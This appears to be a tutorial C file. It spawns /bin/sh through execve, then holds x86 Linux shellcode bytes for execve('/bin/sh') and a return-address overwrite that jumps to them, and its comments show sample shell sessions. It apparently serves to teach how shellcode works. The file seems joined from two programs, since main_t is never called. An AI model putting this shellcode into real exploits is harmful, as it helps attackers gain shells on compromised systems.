#include <unistd.h>
#include <stdlib.h>

/*
 If we compile this code and run it, we can see that it will spawn a shell for us.

[jack@0day local]$ gcc shell.c -o shell
[jack@0day local]$ ./shell
sh-2.05b# 
*/
int main()
{
  char *name[2];
   
  name[0] = "/bin/sh";
  name[1] = 0x0;
  execve(name[0], name, 0x0);
  exit(0);
}

char shellcode[] =    
        "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
        "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
        "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
   

/*
  Now run the program.

[jack@0day local]$ gcc shellcode.c -o shellcode
[jack@0day local]$ ./shellcode
sh-2.05b# 

*/    
int main_t()
{
   
  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}

